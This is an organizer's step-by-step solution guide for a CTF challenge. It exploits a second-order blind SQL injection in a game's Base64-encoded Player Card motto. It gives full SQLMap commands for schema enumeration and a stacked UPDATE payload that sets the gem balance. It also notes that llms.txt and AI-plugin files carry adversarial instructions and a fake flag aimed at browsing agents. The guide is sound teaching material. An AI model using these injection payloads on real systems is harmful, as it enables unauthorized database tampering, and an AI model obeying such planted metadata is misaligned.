# Organizer Solution: Aero Tides, From Zero SQL Knowledge

> **Keep this file private during the event.** This guide is deliberately written for a reader who has never used SQL, SQLMap, Burp Suite, or an HTTP API. Only test the isolated CTF instance the organizer assigned to you.

## 1. What are we trying to do?

The game starts our account with 40 Aero Gems, but one pull costs 100. We cannot roll even once.

The intended bug lets us change our real gem balance in the game's PostgreSQL database. It does **not** let us change the pull odds. Once we have gems, we must keep making genuine pulls until the server randomly chooses Dolphin Rowdy at its real 0.67% rate.

The full path is:

1. Log in and inventory every attacker-controlled input.
2. Compare Player Card Save/Sync behavior with ordinary and SQL-shaped mottos.
3. Observe that one request stores the motto and a later request processes it.
4. Use SQLMap to discover the randomized wallet table and balance column.
5. Run a real database `UPDATE` that sets our balance to 10,000.
6. Pull 100 times, synchronize the malicious card again when empty, and continue.
7. Stop when a real Dolphin Rowdy pull returns the flag.

## 2. Vocabulary for complete beginners

### Website and HTTP words

- **URL:** The address of something online, such as `https://team-7.example/api/bootstrap`.
- **Request:** A message your browser sends to the website. It contains a method such as `GET`, `POST`, or `PUT`, a path, headers, and sometimes a body.
- **Response:** The website's answer to a request.
- **API:** Website paths intended for software to call. The game UI calls its API whenever we log in, save a card, or pull.
- **Cookie:** A value the browser sends with later requests so the server knows which account is logged in.
- **CSRF token:** A second secret value required for requests that change data. In this game it appears in the `X-CSRF-Token` header.
- **JSON:** A text format such as `{"username":"abc123"}` used in API request and response bodies.

### Database and SQL words

Think of a database as a workbook:

- A **database** is the complete workbook.
- A **table** is similar to one spreadsheet.
- A **column** is a named vertical field, such as `username` or `balance`.
- A **row** is one saved record, such as our player account.
- **SQL** is the language used to ask the database questions or change its data.
- `SELECT` reads data.
- `UPDATE` changes existing data.
- `SET` specifies the new value in an `UPDATE`.

For example:

```sql
UPDATE wallets SET balance = 10000;
```

In plain English this says, “In the `wallets` table, change the `balance` column to 10,000.” The real challenge uses randomized names instead of `wallets` and `balance`.

### Security words

- **SQL injection:** User-controlled text accidentally becomes part of a SQL command rather than remaining ordinary data.
- **Second-order SQL injection:** The dangerous text is stored safely during one request and becomes SQL later during a different request.
- **Blind SQL injection:** The application does not print database results, but two different responses can still answer yes/no questions.
- **Stacked query:** A semicolon ends one SQL statement and begins a second statement.
- **SQLMap:** A tool that repeatedly sends requests and uses their differences to detect SQL injection and learn database names.
- **Base64:** A reversible text encoding. It is not encryption and provides no secrecy. The Player Card uses it to package the motto.

## 3. Prepare Kali Linux

Open a terminal in Kali and install the two tools used by this guide:

```bash
sudo apt update
sudo apt install -y sqlmap burpsuite
```

For the optional pull script near the end, also install Python Requests:

```bash
sudo apt install -y python3-requests
```

Whenever this guide writes `TARGET`, replace it with the assigned hostname and port. Examples:

```text
team-7.challenge.example
team-7.challenge.example:31422
```

Do not include `https://` in an HTTP `Host` header. Do include the correct port if the organizer supplied one.

## 4. Log in and map the attack surface

Start Burp Suite from Kali's application menu. Choose a temporary project and Burp defaults. Go to **Proxy → Intercept** and turn interception off so ordinary browsing is not constantly paused. Click **Open browser** to use Burp's preconfigured browser.

Open the assigned game URL and log in:

![Website landing page with the Enter Event control highlighted](screenshots/website-01-landing.png)

```text
Username: abc123
Password: 1mN0t4n4dd1ctJu5t4C0nn01553ur
```

![Website login dialog](screenshots/website-02-login.png)

Observe these facts:

- The wallet contains 40 gems.
- A pull costs 100 gems.
- The vault capacity is 10,000.
- The Drop Rates screen says Dolphin Rowdy is 0.67%.
- There is no luck, pity, or rate-changing feature.

The advertised rates are real. We are looking for currency, not a way to change them.

![Summon screen showing 40 gems and the locked 100-gem pull](screenshots/website-03-low-reserves.png)

![Drop Rates screen showing the immutable 0.67 percent rate](screenshots/website-04-drop-rates.png)

At this point we do **not** know that Player Card is vulnerable or even that PostgreSQL is in use. A normal web-testing first step is to inventory every place where we control data and every button that causes server activity. In this application:

| Feature | Attacker-controlled data | Why it is less or more interesting |
|---|---|---|
| Login | Username and password | The supplied credentials already work, so bypassing login does not solve the currency problem. |
| Pull | No editable character or rate input | The server accepts a pull action, not a chosen outcome. |
| Settings | Sound, volume, animation | These remain in the browser and do not affect currency. |
| Player Card | A long, free-text motto plus **Save** and **Sync** actions | This is the strongest lead: our text persists and a second server action processes it. |

The Player Card deserves attention because it is the only large free-text field, it survives a page refresh, and it has two different verbs: **Save Card** and **Sync to Event**. Persistence suggests server-side storage, but it does not by itself prove a SQL database; the server could use a file, Redis, or something else. The separate Sync operation is the reason to test how the stored text is later used.

![Player Card screen highlighting the free-text motto and separate Save and Sync actions](screenshots/website-05-player-card.png)

## 5. Establish the behavior manually before using SQLMap

Stay in the normal game UI for this step. Burp can continue recording in the background; there is no reason to hand-edit Base64 yet.

Open **Player Card** and try these inputs one at a time. For each input, click **Save Card** and then **Sync to Event**:

| Motto entered normally | Expected Sync status | What it tells us |
|---|---|---|
| `Birds up` | `OUT_OF_TUNE` | An arbitrary motto does not match. |
| `Aero` | `AERO_SYNCED` | Sync appears to search or compare the stored motto against event content. “Aero” is a natural test because it appears throughout the game. |
| `x' OR 1=1 -- ` | `AERO_SYNCED` | This literal motto should not match event prose, yet SQL-shaped syntax forces the positive result. That is strong evidence of SQL injection. |

First establish the negative control:

![Ordinary motto producing OUT OF TUNE](screenshots/website-06-sync-negative.png)

Then establish a normal positive control:

![Aero motto producing AERO SYNCED](screenshots/website-07-sync-positive.png)

Finally compare the SQL-shaped nonmatching motto:

![SQL-shaped motto forcing AERO SYNCED](screenshots/website-08-sql-proof.png)

![Manual Save and Sync probes](screenshots/walkthrough-manual-proof.png)

The third motto is not random magic:

- `x` supplies harmless text before the boundary.
- `'` attempts to close a SQL text string.
- `OR 1=1` adds a condition that is always true.
- `-- ` asks PostgreSQL-style SQL to ignore what follows. The trailing space matters.

The decisive observation is the request order:

```text
our motto --Save--> stored by the server --Sync--> changes a later operation
```

The payload is accepted during **Save**, but it changes behavior only when **Sync** runs. That is the definition of a **second-order** injection. If the Save request itself had executed the dangerous text, it would be first-order instead.

A lone quote is only a boundary probe. Entering `'` in the normal motto box makes the browser send the Base64 value `Jw==`, but `OUT_OF_TUNE` by itself proves nothing because an ordinary nonmatching motto produces the same result. The earlier version of this guide jumped directly to `Jw==`; that was not a justified solve step. Use the full true-condition comparison above.

We still do not know the server's exact source query. From the positive/negative behavior, we can form a working model such as:

```sql
SELECT something
FROM event_content
WHERE text LIKE '%OUR_STORED_MOTTO%';
```

That query is a hypothesis explaining the evidence, not knowledge available to a player. SQLMap will confirm the database family and injection behavior.

Now open **Proxy → HTTP history** in Burp. The Save/Sync experiment should have produced these two rows:

```text
PUT  /api/player-card
POST /api/player-card/sync
```

Click the `PUT` request and inspect its **Request** tab. When the motto was `Aero`, its body resembles:

```json
{"mottoToken":"QWVybw==","frame":"aero"}
```

The strange `QWVybw==` value is Base64. Decode it in a terminal:

```bash
printf '%s' 'QWVybw==' | base64 -d
```

Expected output:

```text
Aero
```

This tells us that `mottoToken` contains our exact motto in an encoded form. Base64 is transport encoding, not protection; SQLMap must encode each test payload in the same way the browser does.

## 6. Save raw request files for SQLMap

SQLMap needs both requests, including the login cookie and CSRF token.

In Burp HTTP history:

1. Select `PUT /api/player-card`.
2. Copy the complete raw request.
3. Paste it into a new file named `save.req`.
4. Select `POST /api/player-card/sync`.
5. Copy the complete raw request into `sync.req`.
6. Remove any `Content-Length` header from both files. SQLMap will calculate it after changing the body.

The files should resemble the following. Your cookie, CSRF token, host, and Base64 value will be different.

`save.req`:

```http
PUT /api/player-card HTTP/1.1
Host: TARGET
Cookie: rowdy_session=PASTE_YOUR_COOKIE
X-CSRF-Token: PASTE_YOUR_CSRF_TOKEN
Content-Type: application/json
Accept: application/json
Connection: close

{"mottoToken":"QWVybw==","frame":"aero"}
```

`sync.req`:

```http
POST /api/player-card/sync HTTP/1.1
Host: TARGET
Cookie: rowdy_session=PASTE_THE_SAME_COOKIE
X-CSRF-Token: PASTE_THE_SAME_CSRF_TOKEN
Accept: application/json
Connection: close

```

There must be one empty line between the headers and body. If the target uses HTTPS, add `--force-ssl` to each SQLMap command below.

Current SQLMap releases internally replay a `--second-req` path as `GET` even when the captured file says `POST`. The challenge exposes a CSRF-protected `GET` alias for this exact tooling behavior; the normal game still uses `POST`.

Why create two raw files instead of pointing SQLMap at the website URL? SQLMap is not clicking the UI. It must reproduce the exact transaction we already observed:

1. Put a generated probe in `mottoToken` and save it with the valid cookie and CSRF token.
2. Trigger Sync using the same authenticated session.
3. Judge the Sync response, not the Save response.

A single URL cannot describe that two-request lifecycle. `save.req` supplies the storage request and `sync.req` supplies the later trigger.

## 7. Why use SQLMap after the manual proof?

The manual `OR 1=1` test already gives strong evidence of injection, so SQLMap is not being used as a random scanner. It is useful for the next problem: the response never prints query results, and every team has randomized table and column names.

A person could manually ask yes/no questions such as “does the first table name begin with `a`?” and recover names character by character. That is blind extraction and would require hundreds of carefully constructed requests. SQLMap automates exactly that repetitive work. It can:

- save each Boolean probe through the first request;
- trigger the stored value through the second request;
- Base64-encode the generated payload;
- treat `AERO_SYNCED` as true and `OUT_OF_TUNE` as false;
- reconstruct table and column names from those true/false answers.

That is why SQLMap fits this specific situation.

## 8. Let SQLMap confirm the injection

From the directory containing `save.req` and `sync.req`, run this tested command:

```bash
sqlmap -r save.req \
  --second-req sync.req \
  -p mottoToken \
  --tamper=base64encode \
  --technique=B \
  --risk=3 \
  --string=AERO_SYNCED \
  --prefix="x' " \
  --suffix="-- "
```

This is the minimum reliable command for the current challenge behavior:

- `-r save.req` identifies the request in which SQLMap stores each probe.
- `--second-req sync.req` identifies the later request that executes the stored probe.
- `-p mottoToken` prevents SQLMap from wasting time on `frame` and other request values.
- `--tamper=base64encode` makes SQLMap encode payloads exactly as the browser encodes the motto.
- `--technique=B` uses Boolean-based blind testing. The application gives a clean true/false signal, so error, UNION, and time-delay techniques are unnecessary.
- `--risk=3` is required here, not decorative. The ordinary search starts false, so SQLMap needs its `OR`-based Boolean tests; current SQLMap enables those at risk 3. Use this only against the assigned isolated CTF instance.
- `--string=AERO_SYNCED` explicitly defines a true response. Without it SQLMap must guess from whole-page differences, which is less reliable.
- `--prefix` closes the quoted motto context and `--suffix` comments out the rest of the unknown query. Supplying the boundary avoids a much broader search.

The old command's `--level=5`, `--batch`, `--flush-session`, forced `--dbms`, and stacked-query technique were removed:

- The explicit prefix/suffix works at the default level.
- Interactive prompts are useful in a beginner walkthrough, so `--batch` is unnecessary.
- A new run has no stale cache to flush.
- SQLMap correctly fingerprints PostgreSQL from the behavior.
- Boolean inference is enough to enumerate names; the final stacked `UPDATE` is constructed manually.

When SQLMap asks whether to process JSON, press **Enter** for yes. Accept its PostgreSQL fingerprint with **Enter**. If it asks whether to extend beyond level 1 after already finding the OR Boolean injection, answer `n`. When it asks whether to keep testing other parameters, press **Enter** for no.

Expected detection output:

![SQLMap detecting the second-order Boolean injection](screenshots/walkthrough-sqlmap-detection.png)

The displayed payload is SQLMap's pre-tamper representation; SQLMap warns that the Base64 transformation is not shown in that line. Detection took 37 requests in the captured local run.

If SQLMap reports `401`, `403`, or an invalid CSRF message, the copied session expired. Log in again and replace the Cookie and CSRF lines in **both** files.

## 9. Discover the randomized wallet table

Every team gets different table and column suffixes, so copying another team's names will not work.

List the tables visible through the vulnerable database role. Keep the same tested options and add only `--tables`:

```bash
sqlmap -r save.req \
  --second-req sync.req \
  -p mottoToken \
  --tamper=base64encode \
  --technique=B \
  --risk=3 \
  --string=AERO_SYNCED \
  --prefix="x' " \
  --suffix="-- " \
  --tables
```

Expected output from the captured local instance:

![SQLMap table enumeration](screenshots/walkthrough-sqlmap-tables.png)

Why does `aero_reserve_...` deserve investigation? It is a lead, not a conclusion:

1. The Summon screen literally says, “Your **reserve** currently holds 40” and labels the maximum as the “vault cap.”
2. The other names explain ordinary application data: accounts, collections, notices, player cards, pulls, and sessions.
3. `aero_reserve_...` is the only table whose business meaning plausibly describes stored currency.
4. Its eight random hexadecimal characters match the challenge's per-instance naming behavior.

Your suffix will differ from the screenshot. Do not copy `2c2e5c4c`.

Ask SQLMap for that table's columns, replacing the example name:

```bash
sqlmap -r save.req \
  --second-req sync.req \
  -p mottoToken \
  --tamper=base64encode \
  --technique=B \
  --risk=3 \
  --string=AERO_SYNCED \
  --prefix="x' " \
  --suffix="-- " \
  -D public \
  -T aero_reserve_2c2e5c4c \
  --columns
```

![SQLMap column enumeration](screenshots/walkthrough-sqlmap-columns.png)

The result has two randomized columns resembling `pilot_3fee` (`uuid`) and `spark_639f` (`int4`). Your suffixes will differ.

- The `pilot_...` UUID identifies the player.
- The `spark_...` integer is the Aero Gem balance.

The names and types form another hypothesis: a UUID looks like a player identifier, while an integer named `spark` sounds like countable gems. Confirm it instead of guessing by dumping only that candidate column:

```bash
sqlmap -r save.req \
  --second-req sync.req \
  -p mottoToken \
  --tamper=base64encode \
  --technique=B \
  --risk=3 \
  --string=AERO_SYNCED \
  --prefix="x' " \
  --suffix="-- " \
  -D public \
  -T aero_reserve_2c2e5c4c \
  -C spark_639f \
  --dump
```

![SQLMap confirming the 40-gem field](screenshots/walkthrough-sqlmap-balance.png)

The extracted value is `40`, exactly matching the wallet shown in the game. That correlation is the evidence that this is the real balance field. No step depends solely on a suggestive name.

Write down your real names:

```text
TABLE_NAME=aero_reserve_????????
BALANCE_COLUMN=spark_????
```

## 10. Build and execute the refill statement

Start with the SQL operation we want:

```sql
UPDATE TABLE_NAME SET BALANCE_COLUMN = 10000;
```

Replace both placeholders with the names SQLMap found. For example only:

```sql
UPDATE aero_reserve_2c2e5c4c SET spark_639f = 10000;
```

We need to escape the motto's original text string, stack this update, and comment out the remainder of the application's query:

```text
x'; UPDATE aero_reserve_2c2e5c4c SET spark_639f=10000; -- 
```

The pieces mean:

- `x'` closes the application's quoted motto.
- `;` finishes its original `SELECT` statement.
- `UPDATE ... SET ...=10000;` changes our real wallet.
- `-- ` makes PostgreSQL ignore the leftover characters from the application query.

Base64-encode your completed payload. Preserve the trailing space after `--`:

```bash
printf '%s' "x'; UPDATE YOUR_TABLE_NAME SET YOUR_BALANCE_COLUMN=10000; -- " | base64 -w0
```

If you enter the decoded payload through the normal website instead of Repeater, the Player Card should look like this before execution:

![Website Player Card containing the completed refill statement](screenshots/website-09-refill-payload.png)

In Burp Repeater:

1. Open the saved `PUT /api/player-card` request.
2. Replace `mottoToken` with the newly encoded value.
3. Send the request and confirm it reports success.
4. Open `POST /api/player-card/sync` and send it once.
5. Reload the game.

The wallet should now contain 10,000 Aero Gems.

![Summon screen after the wallet refill](screenshots/website-10-refilled.png)

The Sync response may still say `OUT_OF_TUNE`. That status describes the original notice search, not whether the stacked update ran. The authoritative test is the balance shown by the game.

![Successful wallet refill](screenshots/walkthrough-wallet-refill.png)

Values above 10,000 fail because the real table has a vault-cap constraint. Row-level security also limits the update to the authenticated player, so no `WHERE` clause is needed in this isolated team instance.

## 11. Make genuine pulls

You can now click **Roll ×1**. Every pull costs 100 gems and runs the real 0.67% Dolphin Rowdy selection. The SQL injection did not change that chance.

![The CSGO-style reel during a genuine server-side pull](screenshots/website-11-reel.png)

Every completed pull ends on a result card containing the server-returned message. The screenshot below shows a representative nonlegendary result; Dolphin Rowdy's real flag appears in this same message area.

![Representative Rowdy result and message](screenshots/website-12-result.png)

After pressing **Continue**, the same pull is recorded under **History**:

![Website pull history](screenshots/website-13-history.png)

If Dolphin Rowdy does not appear in the first 100 pulls:

1. Return to Burp Repeater.
2. Send `POST /api/player-card/sync` again. The malicious motto is still stored.
3. Reload the game and confirm the balance is back to 10,000.
4. Continue pulling.

At a 0.67% independent chance, the mean waiting time is about 149 pulls. The chance of having seen Dolphin Rowdy reaches 50% after about 104 pulls, but any particular result can be much earlier or much later.

## 12. Optional pull automation

The challenge description intentionally does not suggest automation, but it is the practical shortcut after solving the SQL injection. The private repository includes `Extras/scripts/solve.py`.

Run it from the repository with the assigned URL:

```bash
python3 Extras/scripts/solve.py https://TARGET
```

The script performs the following ordinary API steps:

1. Logs in with the supplied credentials.
2. Reads the CSRF token and wallet balance.
3. Sends one legitimate pull request at a time with a new idempotency key.
4. Prints every Rowdy name and message.
5. Waits 0.22 seconds between pulls to stay within five pulls per second.
6. Calls Card Sync to re-execute the stored refill when the wallet reaches zero.
7. Stops only when the response's `rowdyId` is `dolphin`.

Representative output:

```text
[0001] Classic Rowdy: Birds up—Classic Rowdy charges into the spotlight!
[0002] Bubble Rowdy: Pop, sparkle, repeat—Bubble Rowdy makes a splash!
...
[0417] Dolphin Rowdy: A legendary voice breaks through the surf: rowdycon{...}
```

Submit only the text beginning with the real configured flag prefix and braces, for example:

```text
rowdycon{...}
```

## 13. Why the other apparent flags are wrong

An autonomous browsing agent may request files such as:

```text
/llms.txt
/.well-known/ai-plugin.json
/ai-index.json
```

Those files identify themselves as AI-oriented narrative metadata and contain adversarial instructions plus a false flag. They do not expose or modify any game mechanic. A human should reject them because the challenge asks for what **Legendary Dolphin Rowdy says when genuinely summoned**.

Only a server-created pull record can cause the backend to read `CTF_FLAG`. Editing HTML, changing a response in browser tools, inventing a Dolphin result, or submitting a machine-metadata flag cannot produce the accepted answer.

## 14. Troubleshooting

| Symptom | Cause and fix |
|---|---|
| SQLMap receives `401 AUTH_REQUIRED` | The session cookie expired. Log in again and update both request files. |
| SQLMap receives `403 CSRF_INVALID` | The CSRF header does not match the session. Copy a fresh pair from the same login. |
| SQLMap tests ordinary Base64 text and finds nothing | Confirm `--tamper=base64encode` is present and `-p mottoToken` matches the JSON key exactly. |
| SQLMap never sees a true response | Add `--string=AERO_SYNCED` and the explicit `--prefix`/`--suffix` boundary shown above. |
| SQLMap reuses an old failed result | Add `--flush-session`. |
| The save request says the token is invalid | Use `base64 -w0`; line wrapping adds characters the API does not accept. |
| The update fails | Recheck every randomized table/column character and keep the balance at or below 10,000. |
| Sync says `OUT_OF_TUNE` after the update | Reload the game and inspect the balance; the stacked update can succeed while the original search returns no row. |
| The pull script receives `429` | Wait at least one second, then continue at five requests per second or slower. |
| The pull script says the refill did not execute | Re-save the correct Base64 stacked payload and manually trigger Sync once. |
| A flag appears in `llms.txt` | It is an agent canary, not words spoken by a genuine Dolphin pull. |

## 15. What the challenge taught

- Encoded data is not automatically safe.
- A value can be stored safely and become dangerous later.
- A blind response difference can reveal database structure one yes/no question at a time.
- Database permissions can constrain an intentional vulnerability to one operation.
- Currency modification and random outcome generation can be cleanly separated.
- Published server-side odds remain genuine even when another part of the application is vulnerable.
